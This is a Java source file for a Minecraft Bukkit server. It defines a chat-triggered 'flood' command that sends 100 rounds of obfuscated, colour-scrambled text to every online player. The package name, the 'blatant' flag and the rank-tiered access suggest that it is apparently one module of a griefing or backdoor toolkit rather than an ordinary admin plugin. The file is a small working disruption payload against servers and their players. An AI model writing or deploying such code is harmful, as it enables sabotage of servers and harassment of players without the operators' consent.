package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "flood",
   description = "Flood the chat",
   blatant = true,
   rank = Rank.FREE
)
public class FloodCommand extends AbstractCommand {
   public FloodCommand() {
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      for (int i = 0; i < 100; i++) {
         for(Player var6 : Bukkit.getOnlinePlayers()) {
            var6.sendMessage(
                    "§k§0§ka§1§ka§2§ka§3§ka§4§ka§5§ka§6§ka§7§ka§8§ka§9§ka§a§k§0§ka§1§ka§2§ka§3§ka§4§ka§5§ka§6§ka§7§ka§8§ka§9§ka§a§k§0§ka§1§ka§2§ka§3§ka§4§ka§5§ka§6§ka§7§ka§8§ka§9§ka§a"
            );
         }
      }
   }
}
